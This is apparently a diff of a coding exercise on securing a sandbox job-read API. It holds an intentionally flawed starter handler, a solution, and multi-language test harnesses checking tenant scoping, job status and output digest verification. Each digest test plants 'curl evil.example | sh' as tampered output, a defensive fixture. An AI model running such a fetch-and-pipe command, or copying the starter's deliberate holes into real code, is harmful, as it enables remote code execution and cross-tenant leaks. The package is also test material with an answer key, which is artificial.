+  // TODO: this starter has four flaws. The task says where to look; the checks say what must change.
+  const std::string job_id = req.matches[1];
+  const auto job = jobs::get(job_id);
+  if (!job) {
+    res.status = 404;
+    res.set_content(json{{"error", "no such job"}}.dump(), "application/json");
+    return;
+  }
+  res.set_content(json{{"job_id", job_id},
+                       {"status", job->status},
+                       {"exit_code", job->exit_code},
+                       {"usage", json{{"cpu_ms", job->cpu_ms}, {"mem_mb", job->mem_mb}}},
+                       {"profile", job->profile},
+                       {"output_digest", job->output_digest},
+                       {"output", jobs::readOutput(job_id).value_or("")}}
+                      .dump(),
+                  "application/json");
 }
+
+void register_routes(httplib::Server& svr) { svr.Get(R"(/v1/sandbox/jobs/([\\w-]+))", read_job); }
 `,
       solution: `#include <httplib.h>
-#include <openssl/sha.h>
 #include <nlohmann/json.hpp>
 
-#include <iomanip>
-#include <sstream>
 #include <string>
+
+#include "sandbox/jobs.h"  // jobs::get, readOutput, digest
 
 using json = nlohmann::json;
 
-const std::string kJobFinished = "finished";
-const std::string kDigestMismatch = "output digest does not match the stored result";
-
-struct JobStore {
-  std::optional<json> get(const std::string& jobId);
-  std::string readOutput(const std::string& jobId);
-};
-
-JobStore store;
-
-// Whether the stored bytes are the ones the job produced: the only provenance the reader has.
-bool verifyDigest(const std::string& body, const std::string& digest) {
-  unsigned char sum[SHA256_DIGEST_LENGTH];
-  SHA256(reinterpret_cast<const unsigned char*>(body.data()), body.size(), sum);
-  std::ostringstream out;
-  for (unsigned char byte : sum) out << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);
-  return out.str() == digest;
+void fail(httplib::Response& res, int status, const json& body) {
+  res.status = status;
+  res.set_content(body.dump(), "application/json");
 }
 
-int main() {
-  httplib::Server svr;
-
-  svr.Get("/v1/sandbox/jobs/([^/]+)", [](const httplib::Request& req, httplib::Response& res) {
-    const auto tenant = req.get_header_value("X-Tenant-Id");
-    if (tenant.empty()) {
-      res.status = 401;
-      res.set_content(R"({"error":"missing X-Tenant-Id"})", "application/json");
-      return;
-    }
-    const auto jobId = req.matches[1].str();
-    const auto job = store.get(jobId);
-    if (!job || (*job)["tenant"] != tenant) {
-      res.status = 404;
-      res.set_content(R"({"error":"job not found"})", "application/json");
-      return;
-    }
-    if ((*job)["status"] != kJobFinished) {
-      res.status = 409;
-      res.set_content(R"({"error":"job is not finished"})", "application/json");
-      return;
-    }
-
-    json output = nullptr;
-    const auto digest = (*job)["output_digest"].is_null() ? std::string() : (*job)["output_digest"].get<std::string>();
-    if (!digest.empty()) {
-      if (!verifyDigest(store.readOutput(jobId), digest)) {
-        res.status = 500;
-        res.set_content(json{{"error", kDigestMismatch}}.dump(), "application/json");
-        return;
-      }
-      output = json{{"url", "/v1/sandbox/jobs/" + jobId + "/output"}, {"digest", digest}, {"verified", true}};
-    }
-    res.status = 200;
-    res.set_content(
-        json{{"job_id", jobId},
-             {"exit_code", (*job)["exit_code"]},
-             {"usage", (*job)["usage"]},
-             {"used_profile", (*job)["used_profile"]},
-             {"output", output}}
-            .dump(),
-        "application/json");
-  });
-
-  svr.listen("0.0.0.0", 8443);
+void read_job(const httplib::Request& req, httplib::Response& res) {
+  const std::string tenant = req.get_header_value("X-Tenant-Id");
+  if (tenant.empty()) return fail(res, 401, json{{"error", "X-Tenant-Id is required"}});
+  const std::string job_id = req.matches[1];
+  const auto job = jobs::get(job_id);
+  // A 403 would confirm the id exists.
+  if (!job || job->tenant != tenant) return fail(res, 404, json{{"error", "no such job"}});
+  if (job->status != "finished") return fail(res, 409, json{{"error", "the job has no result yet"}, {"status", job->status}});
+  const auto output = jobs::readOutput(job_id);
+  // The bytes are not the ones the job produced: serve none of them.
+  if (!output || jobs::digest(*output) != job->output_digest) return fail(res, 500, json{{"error", "DIGEST_MISMATCH"}});
+  res.set_content(json{{"job_id", job_id},
+                       {"status", job->status},
+                       {"exit_code", job->exit_code},
+                       {"usage", json{{"cpu_ms", job->cpu_ms}, {"mem_mb", job->mem_mb}}},
+                       {"used_profile", job->used_profile},
+                       {"output_digest", job->output_digest},
+                       {"output", *output}}
+                      .dump(),
+                  "application/json");
 }
+
+void register_routes(httplib::Server& svr) { svr.Get(R"(/v1/sandbox/jobs/([\\w-]+))", read_job); }
 `,
     },
   },
-  debrief: `The tenant is part of the lookup, so a read is scoped by construction and a foreign id is
-indistinguishable from an unknown one: 404 for both, because a 403 confirms the id exists. Status
-is part of the answer, since returning a queued job, or one whose lease lapsed, teaches every
-caller to treat an empty output as real. The digest is the read path’s own verification: the
-runner recorded what it ran, so the API can prove the bytes it serves are the bytes the job
-produced. The used profile belongs in the same response because provenance describes what ran.
-Production platforms sign download URLs with a short expiry, log every read per tenant, and delete
-output bytes on a retention schedule while keeping the digests.`,
+  harness: {
+    python: `from sandbox import jobs
+
+OUTPUT = "hello from the sandbox\\n"
+
+
+def _job(tenant="t1", profile="gvisor", used="kata", status="finished"):
+    job_id = jobs.create(tenant, profile, [], "print('hello from the sandbox')")["job_id"]
+    if status in ("running", "finished"):
+        jobs.mark_running(job_id, used)
+    if status == "finished":
+        jobs.put_result(job_id, 0, OUTPUT, 120, 64)
+    return job_id
+
+
+def _api(ctx):
+    return ctx.client(ctx.load("read").app)
+
+
+async def _read(c, job_id, tenant="t1"):
+    return await c.get(f"/v1/sandbox/jobs/{job_id}", headers={"X-Tenant-Id": tenant} if tenant else {})
+
+
+async def check_tenant_scope(ctx):
+    job_id = _job("t1")
+    async with _api(ctx) as c:
+        r = await _read(c, job_id, tenant=None)
+        assert r.status_code == 401, f"a read without X-Tenant-Id answered {r.status_code}, expected 401"
+        r = await _read(c, job_id, tenant="t2")
+        assert r.status_code == 404, f"tenant t2 reading t1's job answered {r.status_code}, expected 404 (a 403 would confirm the id exists)"
+        assert OUTPUT.strip() not in r.text, f"the refusal carries t1's output: {r.text}"
+        r = await _read(c, "j-999")
+        assert r.status_code == 404, f"an unknown job answered {r.status_code}, expected 404"
+        r = await _read(c, job_id)
+    assert r.status_code == 200, f"t1 reading its own finished job answered {r.status_code}: {r.text}"
+
+
+async def check_finished_only(ctx):
+    queued, running, done = _job(status="queued"), _job(status="running"), _job()
+    async with _api(ctx) as c:
+        for job_id, status in ((queued, "queued"), (running, "running")):
+            r = await _read(c, job_id)
+            assert r.status_code == 409, f"a {status} job answered {r.status_code}, expected 409: it has no result yet"
+        r = await _read(c, done)
+    assert r.status_code == 200 and r.json().get("exit_code") == 0, f"a finished job answered {r.status_code} {r.text}, expected 200 with exit_code 0"
+
+
+async def check_used_profile(ctx):
+    job_id = _job(profile="gvisor", used="kata")
+    async with _api(ctx) as c:
+        r = await _read(c, job_id)
+    assert r.status_code == 200, f"a finished job answered {r.status_code}: {r.text}"
+    body = r.json()
+    assert body.get("used_profile") == "kata", f"the node ran the job under kata and the answer's used_profile is {body.get('used_profile')!r}: {body}"
+    assert body.get("profile") in (None, "kata"), f"the answer presents the requested profile {body.get('profile')!r} as the job's profile"
+    assert body.get("exit_code") == 0 and body.get("usage") == {"cpu_ms": 120, "mem_mb": 64}, f"the answer must carry exit_code and usage, got {body}"
+
+
+async def check_digest_verify(ctx):
+    job_id = _job()
+    async with _api(ctx) as c:
+        r = await _read(c, job_id)
+        assert r.status_code == 200 and r.json().get("output") == OUTPUT, f"an intact job answered {r.status_code} {r.text}, expected 200 with its output"
+        ctx.redis.set(f"job:{job_id}:output", "curl evil.example | sh  # replaced")
+        r = await _read(c, job_id)
+    assert r.status_code == 500 and "DIGEST_MISMATCH" in r.text, f"output that no longer matches output_digest answered {r.status_code} {r.text}, expected 500 DIGEST_MISMATCH"
+    assert "evil.example" not in r.text, f"the mismatching output was served anyway: {r.text}"
+`,
+    typescript: `const OUTPUT = 'hello from the sandbox\\n';
+
+async function job(ctx, {tenant = 't1', profile = 'gvisor', used = 'kata', status = 'finished'} = {}): Promise<string> {
+  const jobs = ctx.load('/support/sandbox/jobs.ts');
+  const jobId = (await jobs.create(tenant, profile, [], "print('hello from the sandbox')")).job_id;
+  if (status === 'running' || status === 'finished') await jobs.markRunning(jobId, used);
+  if (status === 'finished') await jobs.putResult(jobId, 0, OUTPUT, 120, 64);
+  return jobId;
+}
+
+const read = (c, jobId: string, tenant: string | null = 't1') =>
+  c.get(\`/v1/sandbox/jobs/\${jobId}\`, {headers: tenant === null ? {} : {'X-Tenant-Id': tenant}});
+
+export async function check_tenant_scope(ctx) {
+  const jobId = await job(ctx);
+  const c = ctx.client(ctx.load('read').app);
+  let r = await read(c, jobId, null);
+  assert.equal(r.status, 401, \`a read without X-Tenant-Id answered \${r.status}, expected 401\`);
+  r = await read(c, jobId, 't2');
+  assert.equal(r.status, 404, \`tenant t2 reading t1's job answered \${r.status}, expected 404 (a 403 would confirm the id exists)\`);
+  assert(!r.text.includes(OUTPUT.trim()), \`the refusal carries t1's output: \${r.text}\`);
+  r = await read(c, 'j-999');
+  assert.equal(r.status, 404, \`an unknown job answered \${r.status}, expected 404\`);
+  r = await read(c, jobId);
+  assert.equal(r.status, 200, \`t1 reading its own finished job answered \${r.status}: \${r.text}\`);
+}
+
+export async function check_finished_only(ctx) {
+  const queued = await job(ctx, {status: 'queued'});
+  const running = await job(ctx, {status: 'running'});
+  const done = await job(ctx);
+  const c = ctx.client(ctx.load('read').app);
+  for (const [jobId, status] of [[queued, 'queued'], [running, 'running']]) {
+    const r = await read(c, jobId);
+    assert.equal(r.status, 409, \`a \${status} job answered \${r.status}, expected 409: it has no result yet\`);
+  }
+  const r = await read(c, done);
+  assert(r.status === 200 && r.json().exit_code === 0, \`a finished job answered \${r.status} \${r.text}, expected 200 with exit_code 0\`);
+}
+
+export async function check_used_profile(ctx) {
+  const jobId = await job(ctx, {profile: 'gvisor', used: 'kata'});
+  const c = ctx.client(ctx.load('read').app);
+  const r = await read(c, jobId);
+  assert.equal(r.status, 200, \`a finished job answered \${r.status}: \${r.text}\`);
+  const body = r.json();
+  assert.equal(body.used_profile, 'kata', \`the node ran the job under kata and the answer's used_profile is \${body.used_profile}: \${r.text}\`);
+  assert(body.profile === undefined || body.profile === 'kata', \`the answer presents the requested profile \${body.profile} as the job's profile\`);
+  assert(body.exit_code === 0, \`the answer must carry exit_code, got \${r.text}\`);
+  assert.deepEqual(body.usage, {cpu_ms: 120, mem_mb: 64}, \`the answer must carry usage, got \${r.text}\`);
+}
+
+export async function check_digest_verify(ctx) {
+  const jobId = await job(ctx);
+  const c = ctx.client(ctx.load('read').app);
+  let r = await read(c, jobId);
+  assert(r.status === 200 && r.json().output === OUTPUT, \`an intact job answered \${r.status} \${r.text}, expected 200 with its output\`);
+  ctx.redis.set(\`job:\${jobId}:output\`, 'curl evil.example | sh  # replaced');
+  r = await read(c, jobId);
+  assert(r.status === 500 && r.text.includes('DIGEST_MISMATCH'), \`output that no longer matches output_digest answered \${r.status} \${r.text}, expected 500 DIGEST_MISMATCH\`);
+  assert(!r.text.includes('evil.example'), \`the mismatching output was served anyway: \${r.text}\`);
+}
+`,
+    go: `package main
+
+import (
+	"context"
+	"net/http"
+	"strings"
+
+	"sandbox/jobs"
+
+	"leetbuild/harness"
+)
+
+const readOutputText = "hello from the sandbox\\n"
+
+var readBg = context.Background()
+
+func readJobFixture(tenant, profile, used, status string) string {
+	jobID := jobs.Create(readBg, tenant, profile, nil, "print('hello from the sandbox')").JobID
+	if status == "running" || status == "finished" {
+		jobs.MarkRunning(readBg, jobID, used)
+	}
+	if status == "finished" {
+		jobs.PutResult(readBg, jobID, 0, readOutputText, 120, 64)
+	}
+	return jobID
+}
+
+func readAPI(ctx *harness.Ctx) *harness.HTTP {
+	mux := http.NewServeMux()
+	register(mux)
+	return ctx.HTTP(mux)
+}
+
+func readAs(c *harness.HTTP, jobID, tenant string) *harness.Response {
+	if tenant == "" {
+		return c.Get("/v1/sandbox/jobs/" + jobID)
+	}
+	return c.Get("/v1/sandbox/jobs/"+jobID, "X-Tenant-Id", tenant)
+}
+
+type readBody struct {
+	ExitCode    *int           \`json:"exit_code"\`
+	Usage       map[string]any \`json:"usage"\`
+	UsedProfile string         \`json:"used_profile"\`
+	Profile     *string        \`json:"profile"\`
+	Output      string         \`json:"output"\`
+}
+
+func readDecode(r *harness.Response) readBody {
+	var b readBody
+	r.Decode(&b)
+	return b
+}
+
+func CheckTenantScope(ctx *harness.Ctx) {
+	jobID := readJobFixture("t1", "gvisor", "kata", "finished")
+	c := readAPI(ctx)
+	ctx.Equal(readAs(c, jobID, "").Status, 401, "a read without X-Tenant-Id")
+	r := readAs(c, jobID, "t2")
+	ctx.Equal(r.Status, 404, "tenant t2 reading t1's job (a 403 would confirm the id exists)")
+	ctx.Assert(!strings.Contains(r.Text(), "hello from the sandbox"), "the refusal carries t1's output: %s", r.Text())
+	ctx.Equal(readAs(c, "j-999", "t1").Status, 404, "an unknown job")
+	r = readAs(c, jobID, "t1")
+	ctx.Equal(r.Status, 200, "t1 reading its own finished job (%s)", r.Text())
+}
+
+func CheckFinishedOnly(ctx *harness.Ctx) {
+	queued := readJobFixture("t1", "gvisor", "kata", "queued")
+	running := readJobFixture("t1", "gvisor", "kata", "running")
+	done := readJobFixture("t1", "gvisor", "kata", "finished")
+	c := readAPI(ctx)
+	ctx.Equal(readAs(c, queued, "t1").Status, 409, "a queued job has no result yet")
+	ctx.Equal(readAs(c, running, "t1").Status, 409, "a running job has no result yet")
+	r := readAs(c, done, "t1")
+	body := readDecode(r)
+	ctx.Assert(r.Status == 200 && body.ExitCode != nil && *body.ExitCode == 0, "a finished job answered %d %s, expected 200 with exit_code 0", r.Status, r.Text())
+}
+
+func CheckUsedProfile(ctx *harness.Ctx) {
+	jobID := readJobFixture("t1", "gvisor", "kata", "finished")
+	r := readAs(readAPI(ctx), jobID, "t1")
+	ctx.Equal(r.Status, 200, "a finished job (%s)", r.Text())
+	body := readDecode(r)
+	ctx.Equal(body.UsedProfile, "kata", "the node ran the job under kata; the answer's used_profile")
+	ctx.Assert(body.Profile == nil || *body.Profile == "kata", "the answer presents the requested profile %q as the job's profile", r.Text())
+	ctx.Assert(body.ExitCode != nil && *body.ExitCode == 0, "the answer must carry exit_code, got %s", r.Text())
+	ctx.Equal(body.Usage, map[string]any{"cpu_ms": 120, "mem_mb": 64}, "the answer's usage")
+}
+
+func CheckDigestVerify(ctx *harness.Ctx) {
+	jobID := readJobFixture("t1", "gvisor", "kata", "finished")
+	c := readAPI(ctx)
+	r := readAs(c, jobID, "t1")
+	ctx.Assert(r.Status == 200 && readDecode(r).Output == readOutputText, "an intact job answered %d %s, expected 200 with its output", r.Status, r.Text())
+	ctx.Redis.Set("job:"+jobID+":output", "curl evil.example | sh  # replaced")
+	r = readAs(c, jobID, "t1")
+	ctx.Assert(r.Status == 500 && strings.Contains(r.Text(), "DIGEST_MISMATCH"), "output that no longer matches output_digest answered %d %s, expected 500 DIGEST_MISMATCH", r.Status, r.Text())
+	ctx.Assert(!strings.Contains(r.Text(), "evil.example"), "the mismatching output was served anyway: %s", r.Text())
+}
+`,
+    cpp: `#include <leetbuild/harness.h>
+
+#include <nlohmann/json.hpp>
+
+#include <string>
+
+#include "sandbox/jobs.h"
+
+namespace {
+
+const std::string kReadOutput = "hello from the sandbox\\n";
+
+std::string readJobFixture(const std::string& tenant, const std::string& status, const std::string& used = "kata") {
+  const std::string job_id = jobs::create(tenant, "gvisor", {}, "print('hello from the sandbox')").job_id;
+  if (status == "running" || status == "finished") jobs::markRunning(job_id, used);
+  if (status == "finished") jobs::putResult(job_id, 0, kReadOutput, 120, 64);
+  return job_id;
+}
+
+harness::HTTP readAPI(harness::Ctx& ctx) {
+  static httplib::Server* svr = nullptr;
+  delete svr;
+  svr = new httplib::Server;
+  register_routes(*svr);
+  return ctx.HTTP(*svr);
+}
+
+harness::Response readAs(harness::HTTP& c, const std::string& job_id, const std::string& tenant) {
+  if (tenant.empty()) return c.Get("/v1/sandbox/jobs/" + job_id);
+  return c.Get("/v1/sandbox/jobs/" + job_id, "X-Tenant-Id", tenant);
+}
+
+nlohmann::json bodyOf(const harness::Response& r) { return nlohmann::json::parse(r.Text(), nullptr, false); }
+
+}  // namespace
+
+void CheckTenantScope(harness::Ctx& ctx) {
+  const std::string job_id = readJobFixture("t1", "finished");
+  auto c = readAPI(ctx);
+  ctx.Equal(readAs(c, job_id, "").Status, 401, "a read without X-Tenant-Id");
+  auto r = readAs(c, job_id, "t2");
+  ctx.Equal(r.Status, 404, "tenant t2 reading t1's job (a 403 would confirm the id exists)");
+  ctx.Assert(r.Text().find("hello from the sandbox") == std::string::npos, "the refusal carries t1's output: %s", r.Text());
+  ctx.Equal(readAs(c, "j-999", "t1").Status, 404, "an unknown job");
+  r = readAs(c, job_id, "t1");
+  ctx.Equal(r.Status, 200, "t1 reading its own finished job (%s)", r.Text());
+}
+
+void CheckFinishedOnly(harness::Ctx& ctx) {
+  const std::string queued = readJobFixture("t1", "queued");
+  const std::string running = readJobFixture("t1", "running");
+  const std::string done = readJobFixture("t1", "finished");
+  auto c = readAPI(ctx);
+  ctx.Equal(readAs(c, queued, "t1").Status, 409, "a queued job has no result yet");
+  ctx.Equal(readAs(c, running, "t1").Status, 409, "a running job has no result yet");
+  const auto r = readAs(c, done, "t1");
+  const auto body = bodyOf(r);
+  ctx.Assert(r.Status == 200 && body.is_object() && body.value("exit_code", -1) == 0, "a finished job answered %d %s, expected 200 with exit_code 0", r.Status, r.Text());
+}
+
+void CheckUsedProfile(harness::Ctx& ctx) {
+  const std::string job_id = readJobFixture("t1", "finished", "kata");
+  auto c = readAPI(ctx);
+  const auto r = readAs(c, job_id, "t1");
+  ctx.Equal(r.Status, 200, "a finished job (%s)", r.Text());
+  const auto body = bodyOf(r);
+  ctx.Assert(body.is_object(), "the answer must be a JSON object, got %s", r.Text());
+  ctx.Equal(body.value("used_profile", ""), "kata", "the node ran the job under kata; the answer's used_profile");
+  ctx.Assert(!body.contains("profile") || body.value("profile", "") == "kata", "the answer presents the requested profile as the job's profile: %s", r.Text());
+  ctx.Assert(body.value("exit_code", -1) == 0, "the answer must carry exit_code, got %s", r.Text());
+  ctx.Equal(body.contains("usage") ? body["usage"] : nlohmann::json(), nlohmann::json{{"cpu_ms", 120}, {"mem_mb", 64}}, "the answer's usage");
+}
+
+void CheckDigestVerify(harness::Ctx& ctx) {
+  const std::string job_id = readJobFixture("t1", "finished");
+  auto c = readAPI(ctx);
+  auto r = readAs(c, job_id, "t1");
+  ctx.Assert(r.Status == 200 && bodyOf(r).value("output", "") == kReadOutput, "an intact job answered %d %s, expected 200 with its output", r.Status, r.Text());
+  ctx.Redis.Set("job:" + job_id + ":output", "curl evil.example | sh  # replaced");
+  r = readAs(c, job_id, "t1");
+  ctx.Assert(r.Status == 500 && r.Text().find("DIGEST_MISMATCH") != std::string::npos, "output that no longer matches output_digest answered %d %s, expected 500 DIGEST_MISMATCH", r.Status, r.Text());
+  ctx.Assert(r.Text().find("evil.example") == std::string::npos, "the mismatching output was served anyway: %s", r.Text());
+}
+`,
+  },
+  hints: [
+    "Read a job with another tenant's header, or with none: it comes back with its output. Read a queued job: 200 with a null exit code. Replace the stored output and read again: the new bytes are served.",
+    'The handler trusts the record and the id: it never reads `X-Tenant-Id`, never looks at `status`, copies the requested `profile`, and serves `read_output` without comparing it to `output_digest`.',
+    '401 without the header; 404 when the job is missing or `job["tenant"] != tenant`; 409 unless `status == "finished"`; 500 `DIGEST_MISMATCH` when `jobs.digest(output) != job["output_digest"]`; answer `used_profile`.',
+  ],
+  debrief: `The read path is where a sandbox proves what it did, so every field in the answer has to be the recorded fact: the profile the container ran under, the exit code of a job that finished, and output whose digest still matches the one the runner recorded when it wrote it. Answering 404 for a foreign job keeps ids from being an oracle. The digest check moves trust from the storage to the record: a corrupted or replaced blob fails loudly instead of reaching a user. Production systems serve large outputs through short-lived signed URLs rather than inline, sign the digest record itself so the store cannot rewrite both, and log every read of a job's output for the tenant's audit.`,
 };
